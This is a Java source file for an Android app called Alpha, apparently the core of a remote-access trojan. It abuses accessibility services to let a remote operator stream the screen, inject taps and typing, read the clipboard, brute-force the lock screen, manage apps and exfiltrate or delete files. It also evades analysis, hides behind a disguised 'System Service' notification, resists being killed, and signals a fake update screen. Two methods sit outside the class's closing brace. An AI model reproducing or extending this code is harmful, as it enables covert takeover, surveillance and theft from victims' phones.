package com.alpha.shield;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.app.NotificationCompat;

import com.alpha.shield.core.AutoReconnect;
import com.alpha.shield.stealth.AntiAnalysis;

import org.json.JSONObject;
import org.lsposed.lsparanoid.Obfuscate;

import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * CommandService — Alpha's main AccessibilityService.
 *
 * Acts as the central orchestrator:
 *   - Maintains WebSocket connection via AutoReconnect
 *   - Sends registration packet on connect
 *   - Routes all inbound commands to subsystems
 *   - Forwards VNC binary frames to server
 *   - Runs hierarchy polling loop for Ly reader
 *   - Implements GestureCore.ScreenWakeDelegate
 *   - Provides foreground notification for process survival
 */
@Obfuscate
public class CommandService extends AccessibilityService
        implements GestureCore.ScreenWakeDelegate,
                   VncEngine.FrameCallback,
                   AppManager.Callback,
                   LockManager.Callback,
                   FileManager.Callback {

    private static final String TAG          = "CS";
    private static final String PREFS_NAME   = "alpha_prefs";
    private static final String KEY_DEV_ID   = "dev_id";
    private static final String NOTIF_CH     = "alpha_svc";
    private static final int    NOTIF_ID     = 1;

    // Live singleton reference for SurvivalManager and BootReceiver
    public static volatile CommandService INSTANCE = null;

    // ── Core subsystems ────────────────────────────────────────────────────────
    private AutoReconnect ws;
    private VncEngine     vncEngine;
    private GestureCore   gestures;
    private LyBridge      lyBridge;
    private AppManager    appManager;
    private LockManager   lockManager;
    private FileManager   fileManager;
    private SurvivalManager survivalManager;

    // ── State ──────────────────────────────────────────────────────────────────
    private String          deviceId;
    private PowerManager.WakeLock partialWakeLock;
    private final Handler   mainHandler     = new Handler(Looper.getMainLooper());
    private final AtomicBoolean hierarchyPoll = new AtomicBoolean(false);
    private volatile int    hierarchyInterval = 700;  // ms
    private Runnable        hierarchyRunnable;
    private volatile boolean secureWindowFlag = false;

    // MediaProjection token (received from operator grant flow)
    private Intent projectionResultData = null;

    // ── Lifecycle ──────────────────────────────────────────────────────────────

    @Override
    public void onServiceConnected() {
        INSTANCE = this;
        Log.d(TAG, "accessibility service connected");

        if (AntiAnalysis.isThreat(this)) {
            Log.w(TAG, "analysis environment detected — aborting");
            return;
        }

        deviceId = getOrCreateDeviceId();
        initNotification();
        initSubsystems();
        acquirePartialWakeLock();

        survivalManager = new SurvivalManager(this);
        survivalManager.armAll();

        connectWebSocket();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Package tracking for status broadcasts
        if (event.getPackageName() != null) {
            String pkg = event.getPackageName().toString();
            // Lightweight — just update cached package, don't do I/O here
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "interrupted");
    }

    @Override
    public void onDestroy() {
        INSTANCE = null;
        stopHierarchyPoll();
        if (vncEngine  != null) vncEngine.stopAll();
        if (fileManager != null) fileManager.shutdown();
        if (ws         != null) ws.destroy();
        releaseWakeLock();
        super.onDestroy();
        Log.d(TAG, "destroyed — survival manager will restart");
    }

    // ── Init ───────────────────────────────────────────────────────────────────

    private void initSubsystems() {
        gestures    = new GestureCore(this, this);
        lyBridge    = new LyBridge(this);
        vncEngine   = new VncEngine(this, this);
        appManager  = new AppManager(this, gestures, this);
        lockManager = new LockManager(this, gestures, this);
        fileManager = new FileManager(this);
    }

    private void connectWebSocket() {
        String url = BuildConfig.SERVER_URL;
        ws = new AutoReconnect(url, new AutoReconnect.Listener() {
            @Override public void onMessage(String text)   { handleTextMessage(text); }
            @Override public void onBinary(byte[] data)    { handleBinaryMessage(data); }
            @Override public void onConnected()            { onWsConnected(); }
            @Override public void onDisconnected()         { onWsDisconnected(); }
        });
    }

    // ── WebSocket events ───────────────────────────────────────────────────────

    private void onWsConnected() {
        Log.d(TAG, "ws connected — registering");
        sendRegistration();
    }

    private void onWsDisconnected() {
        Log.d(TAG, "ws disconnected");
        stopHierarchyPoll();
        // VNC stays primed; will re-send on reconnect notification
    }

    // ── Registration ───────────────────────────────────────────────────────────

    private void sendRegistration() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager)
                    getSystemService(BATTERY_SERVICE);
            int battery = bm != null ? bm.getIntProperty(
                    android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;

            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String operator = "";
            try { operator = tm != null ? tm.getNetworkOperatorName() : ""; }
            catch (Exception ignored) {}

            JSONObject reg = new JSONObject();
            reg.put("type",         Protocol.T_REGISTER);
            reg.put("id",           deviceId);
            reg.put("model",        Build.MANUFACTURER + " " + Build.MODEL);
            reg.put("sdk",          Build.VERSION.SDK_INT);
            reg.put("screenW",      getResources().getDisplayMetrics().widthPixels);
            reg.put("screenH",      getResources().getDisplayMetrics().heightPixels);
            reg.put("battery",      battery);
            reg.put("operator",     operator);
            reg.put("accessibility", true);
            reg.put("vnc_v1",       Build.VERSION.SDK_INT >= 30);
            ws.sendJson(reg.toString());
        } catch (Exception e) {
            Log.e(TAG, "register: " + e.getMessage());
        }
    }

    // ── Text command router ────────────────────────────────────────────────────

    private void handleTextMessage(String text) {
        try {
            JSONObject msg = new JSONObject(text);
            String action  = msg.optString("action",
                             msg.optString("type", ""));
            if (action.isEmpty()) return;

            switch (action) {
                // ── VNC ───────────────────────────────────────────────────────
                case Protocol.CMD_START_VNC:
                    vncEngine.setTargetFps(msg.optInt("fps", 20));
                    vncEngine.setQuality(msg.optInt("quality", 50));
                    vncEngine.startV1();
                    break;

                case Protocol.CMD_STOP_VNC:
                    vncEngine.stopV1();
                    break;

                case Protocol.CMD_START_VNC_V2:
                    if (projectionResultData != null) {
                        MediaProjectionManager mpm = (MediaProjectionManager)
                                getSystemService(MEDIA_PROJECTION_SERVICE);
                        MediaProjection proj = mpm.getMediaProjection(
                                android.app.Activity.RESULT_OK, projectionResultData);
                        vncEngine.startV2(proj);
                    }
                    break;

                case Protocol.CMD_STOP_VNC_V2:
                    vncEngine.stopV2();
                    break;

                case Protocol.CMD_SET_VNC_QUALITY:
                    vncEngine.setQuality(msg.optInt("quality", 50));
                    break;

                case Protocol.CMD_SET_VNC_FPS:
                    vncEngine.setTargetFps(msg.optInt("fps", 20));
                    break;

                case Protocol.CMD_FORCE_RESTART_VNC:
                    vncEngine.stopAll();
                    mainHandler.postDelayed(() -> vncEngine.startV1(), 500);
                    break;

                // ── Ly ────────────────────────────────────────────────────────
                case Protocol.CMD_REQUEST_HIERARCHY: {
                    String hier = lyBridge.buildHierarchy(secureWindowFlag);
                    sendJson(Protocol.T_HIERARCHY, "id", deviceId, "data", hier);
                    break;
                }
                case "hierarchy_subscribe":
                    hierarchyInterval = msg.optInt("interval", 700);
                    startHierarchyPoll();
                    break;

                case "hierarchy_unsubscribe":
                    stopHierarchyPoll();
                    break;

                // ── Gestures ──────────────────────────────────────────────────
                case Protocol.CMD_TAP:
                    gestures.tap(msg.optDouble("x"), msg.optDouble("y"));
                    break;

                case Protocol.CMD_DOUBLE_TAP:
                    gestures.doubleTap(msg.optDouble("x"), msg.optDouble("y"));
                    break;

                case Protocol.CMD_LONG_PRESS:
                    gestures.longPress(msg.optDouble("x"), msg.optDouble("y"),
                            msg.optInt("duration", 600));
                    break;

                case Protocol.CMD_SWIPE:
                    gestures.swipe(msg.optDouble("x1"), msg.optDouble("y1"),
                            msg.optDouble("x2"), msg.optDouble("y2"),
                            msg.optInt("duration", 300));
                    break;

                case Protocol.CMD_PINCH:
                    gestures.pinch(msg.optDouble("cx"), msg.optDouble("cy"),
                            msg.optDouble("fromDist"), msg.optDouble("toDist"),
                            msg.optInt("duration", 300));
                    break;

                case Protocol.CMD_DRAG:
                    gestures.drag(msg.optDouble("sx"), msg.optDouble("sy"),
                            msg.optDouble("ex"), msg.optDouble("ey"),
                            msg.optInt("holdMs", 500), msg.optInt("dragMs", 400));
                    break;

                case Protocol.CMD_PATH:
                    gestures.pathGesture(msg.optJSONArray("points"));
                    break;

                case Protocol.CMD_TYPE:
                    gestures.type(msg.optString("text", ""));
                    break;

                case Protocol.CMD_CLIPBOARD_SET:
                    gestures.setClipboard(msg.optString("text", ""));
                    break;

                case Protocol.CMD_CLIPBOARD_GET: {
                    String clip = gestures.getClipboard();
                    sendJson("clipboard", "id", deviceId, "text", clip);
                    break;
                }

                // ── Navigation ────────────────────────────────────────────────
                case Protocol.CMD_BACK:          gestures.back();          break;
                case Protocol.CMD_HOME:          gestures.home();          break;
                case Protocol.CMD_RECENTS:       gestures.recents();       break;
                case Protocol.CMD_NOTIFICATIONS: gestures.notifications(); break;
                case Protocol.CMD_QUICK_SETTINGS: gestures.quickSettings(); break;
                case Protocol.CMD_LOCK_DEVICE:   gestures.lockScreen();    break;
                case Protocol.CMD_POWER_MENU:    gestures.powerMenu();     break;
                case Protocol.CMD_WAKEUP:        wakeUpScreen();           break;
                case Protocol.CMD_VOLUME_UP:     gestures.volumeUp();      break;
                case Protocol.CMD_VOLUME_DOWN:   gestures.volumeDown();    break;

                case Protocol.CMD_SNAP_SCREEN:
                    // Single screenshot — handled by VncEngine one-shot
                    if (Build.VERSION.SDK_INT >= 30) {
                        vncEngine.startV1();
                        mainHandler.postDelayed(() -> vncEngine.stopV1(), 500);
                    }
                    break;

                // ── App Manager ───────────────────────────────────────────────
                case Protocol.CMD_LIST_APPS:
                    appManager.listApps(
                            msg.optBoolean("includeSystem", false),
                            msg.optBoolean("includeIcons", true));
                    break;

                case Protocol.CMD_LAUNCH_APP:
                    appManager.launchApp(msg.optString("pkg"));
                    break;

                case Protocol.CMD_FORCE_STOP:
                    appManager.forceStop(msg.optString("pkg"));
                    break;

                case Protocol.CMD_UNINSTALL:
                    appManager.uninstall(msg.optString("pkg"));
                    break;

                // ── Lock Manager ──────────────────────────────────────────────
                case Protocol.CMD_GET_LOCK_STATUS:
                    lockManager.getStatus();
                    break;

                case Protocol.CMD_AUTO_UNLOCK:
                    lockManager.unlockNow(
                            msg.optString("pin", null),
                            msg.optString("pattern", null),
                            msg.optBoolean("bruteforce", false));
                    break;

                // ── File Manager ──────────────────────────────────────────────
                case Protocol.CMD_LIST_FILES:
                    fileManager.listPath(msg.optString("path",
                            android.os.Environment.getExternalStorageDirectory()
                                    .getAbsolutePath()));
                    break;

                case Protocol.CMD_DOWNLOAD_FILE:
                    fileManager.downloadFile(
                            msg.optString("path"),
                            msg.optString("transferId"));
                    break;

                case Protocol.CMD_UPLOAD_INIT:
                    fileManager.uploadInit(
                            msg.optString("transferId"),
                            msg.optString("destPath"),
                            msg.optInt("totalChunks", 1));
                    break;

                case Protocol.CMD_UPLOAD_CHUNK:
                    fileManager.uploadChunk(
                            msg.optString("transferId"),
                            msg.optInt("chunkIdx", 0),
                            msg.optString("data"),
                            msg.optString("destPath"));
                    break;

                case Protocol.CMD_DELETE_FILE:
                    fileManager.deleteFile(msg.optString("path"));
                    break;

                case Protocol.CMD_RENAME_FILE:
                    fileManager.renameFile(msg.optString("path"),
                            msg.optString("newName"));
                    break;

                case Protocol.CMD_MKDIR:
                    fileManager.mkdir(msg.optString("path"));
                    break;

                case Protocol.CMD_MOVE_FILE:
                    fileManager.moveFile(msg.optString("src"),
                            msg.optString("dest"));
                    break;

                case Protocol.CMD_COPY_FILE:
                    fileManager.copyFile(msg.optString("src"),
                            msg.optString("dest"));
                    break;

                case Protocol.CMD_READ_FILE:
                    fileManager.readFile(msg.optString("path"),
                            msg.optString("transferId"));
                    break;

                // ── System ────────────────────────────────────────────────────
                case Protocol.CMD_GET_DEVICE_INFO:
                    sendDeviceInfo();
                    break;

                case Protocol.CMD_PING:
                    sendJson(Protocol.T_PONG, "id", deviceId,
                             "ts", System.currentTimeMillis());
                    break;

                default:
                    Log.d(TAG, "unknown action: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "handleText: " + e.getMessage());
        }
    }

    private void handleBinaryMessage(byte[] data) {
        // Binary messages from server: currently unused in Alpha (all cmds are JSON)
        // Reserved for future binary command protocol
    }

    // ── VncEngine.FrameCallback ────────────────────────────────────────────────

    @Override
    public void onFrame(byte[] frameWithHeader, boolean isV2) {
        ws.sendBinary(frameWithHeader);
    }

    @Override
    public void onSecureWindowDetected() {
        secureWindowFlag = true;
        try {
            JSONObject obj = new JSONObject();
            obj.put("type",   "secure_window");
            obj.put("id",     deviceId);
            obj.put("secure", true);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    // ── AppManager.Callback ────────────────────────────────────────────────────

    @Override
    public void onAppList(String json) {
        try {
            JSONObject wrapper = new JSONObject(json);
            wrapper.put("type", Protocol.T_APP_LIST);
            wrapper.put("id",   deviceId);
            ws.sendJson(wrapper.toString());
        } catch (Exception ignored) {}
    }

    @Override
    public void onResult(String cmd, String pkg, boolean success, String msg) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type",    Protocol.T_CMD_ACK);
            obj.put("id",      deviceId);
            obj.put("cmd",     cmd);
            obj.put("pkg",     pkg);
            obj.put("success", success);
            obj.put("msg",     msg);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    // ── LockManager.Callback ───────────────────────────────────────────────────

    @Override
    public void onLockStatus(String json) {
        try {
            JSONObject obj = new JSONObject(json);
            obj.put("type", Protocol.T_LOCK_STATUS);
            obj.put("id",   deviceId);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    @Override
    public void onUnlockResult(boolean success, String detail) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type",    Protocol.T_CMD_ACK);
            obj.put("id",      deviceId);
            obj.put("cmd",     "AUTO_UNLOCK");
            obj.put("success", success);
            obj.put("msg",     detail);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    // ── FileManager.Callback ───────────────────────────────────────────────────

    @Override
    public void onFileList(String path, String json) {
        try {
            JSONObject obj = new JSONObject(json.startsWith("{") ? json : "{}");
            obj.put("type", Protocol.T_FILE_LIST);
            obj.put("id",   deviceId);
            obj.put("path", path);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    @Override
    public void onFileChunk(String transferId, int chunkIdx, int totalChunks,
                            String base64Chunk, boolean done) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type",        Protocol.T_FILE_CHUNK);
            obj.put("id",          deviceId);
            obj.put("transferId",  transferId);
            obj.put("chunkIdx",    chunkIdx);
            obj.put("totalChunks", totalChunks);
            obj.put("data",        base64Chunk);
            obj.put("done",        done);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    @Override
    public void onUploadResult(String transferId, boolean success, String msg) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type",       Protocol.T_FILE_UPLOAD_DONE);
            obj.put("id",         deviceId);
            obj.put("transferId", transferId);
            obj.put("success",    success);
            obj.put("msg",        msg);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    @Override
    public void onOpResult(String op, String path, boolean success, String msg) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type",    Protocol.T_CMD_ACK);
            obj.put("id",      deviceId);
            obj.put("cmd",     op);
            obj.put("path",    path);
            obj.put("success", success);
            obj.put("msg",     msg);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    // ── Hierarchy polling ──────────────────────────────────────────────────────

    private void startHierarchyPoll() {
        stopHierarchyPoll();
        hierarchyPoll.set(true);
        hierarchyRunnable = new Runnable() {
            @Override public void run() {
                if (!hierarchyPoll.get()) return;
                try {
                    String h = lyBridge.buildHierarchy(secureWindowFlag);
                    JSONObject obj = new JSONObject();
                    obj.put("type", Protocol.T_HIERARCHY);
                    obj.put("id",   deviceId);
                    obj.put("data", h);
                    ws.sendJson(obj.toString());
                } catch (Exception ignored) {}
                mainHandler.postDelayed(this, hierarchyInterval);
            }
        };
        mainHandler.post(hierarchyRunnable);
    }

    private void stopHierarchyPoll() {
        hierarchyPoll.set(false);
        if (hierarchyRunnable != null) {
            mainHandler.removeCallbacks(hierarchyRunnable);
            hierarchyRunnable = null;
        }
    }

    // ── GestureCore.ScreenWakeDelegate ────────────────────────────────────────

    @Override
    public void wakeUpScreen() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isInteractive()) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                | PowerManager.ACQUIRE_CAUSES_WAKEUP
                                | PowerManager.ON_AFTER_RELEASE,
                        "alpha:wake");
                wl.acquire(3000L);
                wl.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "wake: " + e.getMessage());
        }
    }

    // ── Device info ────────────────────────────────────────────────────────────

    private void sendDeviceInfo() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager)
                    getSystemService(BATTERY_SERVICE);
            int battery = bm != null ? bm.getIntProperty(
                    android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;

            JSONObject obj = new JSONObject();
            obj.put("type",        Protocol.T_DEVICE_INFO);
            obj.put("id",          deviceId);
            obj.put("model",       Build.MANUFACTURER + " " + Build.MODEL);
            obj.put("brand",       Build.BRAND);
            obj.put("sdk",         Build.VERSION.SDK_INT);
            obj.put("release",     Build.VERSION.RELEASE);
            obj.put("screenW",     getResources().getDisplayMetrics().widthPixels);
            obj.put("screenH",     getResources().getDisplayMetrics().heightPixels);
            obj.put("density",     getResources().getDisplayMetrics().densityDpi);
            obj.put("battery",     battery);
            obj.put("vncV1",       Build.VERSION.SDK_INT >= 30);
            obj.put("accessibility", true);
            obj.put("isRoot",      AntiAnalysis.hasRoot());
            ws.sendJson(obj.toString());
        } catch (Exception e) {
            Log.e(TAG, "deviceInfo: " + e.getMessage());
        }
    }

    // ── Notification (foreground survival) ────────────────────────────────────

    private void initNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    NOTIF_CH, "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }

        Intent tapIntent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, tapIntent,
                Build.VERSION.SDK_INT >= 23
                        ? PendingIntent.FLAG_IMMUTABLE : 0);

        NotificationCompat.Builder nb = new NotificationCompat.Builder(this, NOTIF_CH)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setShowWhen(false)
                .setContentIntent(pi);

        startForeground(NOTIF_ID, nb.build());
    }

    // ── Wake lock ──────────────────────────────────────────────────────────────

    private void acquirePartialWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                partialWakeLock = pm.newWakeLock(
                        PowerManager.PARTIAL_WAKE_LOCK, "alpha:partial");
                partialWakeLock.setReferenceCounted(false);
                partialWakeLock.acquire();
            }
        } catch (Exception e) {
            Log.e(TAG, "wakeLock: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (partialWakeLock != null && partialWakeLock.isHeld())
                partialWakeLock.release();
        } catch (Exception ignored) {}
    }

    // ── Device ID ─────────────────────────────────────────────────────────────

    private String getOrCreateDeviceId() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String id = prefs.getString(KEY_DEV_ID, null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            prefs.edit().putString(KEY_DEV_ID, id).apply();
        }
        return id;
    }

    // ── JSON send helpers ─────────────────────────────────────────────────────

    private void sendJson(String type, Object... kv) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type", type);
            for (int i = 0; i < kv.length - 1; i += 2)
                obj.put(kv[i].toString(), kv[i + 1]);
            ws.sendJson(obj.toString());
        } catch (Exception ignored) {}
    }

    // ── Static accessor (for SurvivalManager, receivers) ─────────────────────

    public static boolean isAlive() { return INSTANCE != null; }
}

    // ── Fake screen signalling (called from FakeUpdateActivity) ───────────────

    public void onFakeScreenStarted(android.os.IBinder windowToken) {
        if (vncEngine != null) {
            vncEngine.fakeScreenToken  = windowToken;
            vncEngine.fakeScreenActive = true;
        }
        // Notify operator dashboard
        sendJson("fake_screen_active", "id", deviceId, "active", true);
    }

    public void onFakeScreenStopped() {
        if (vncEngine != null) {
            vncEngine.fakeScreenToken  = null;
            vncEngine.fakeScreenActive = false;
        }
        sendJson("fake_screen_active", "id", deviceId, "active", false);
    }
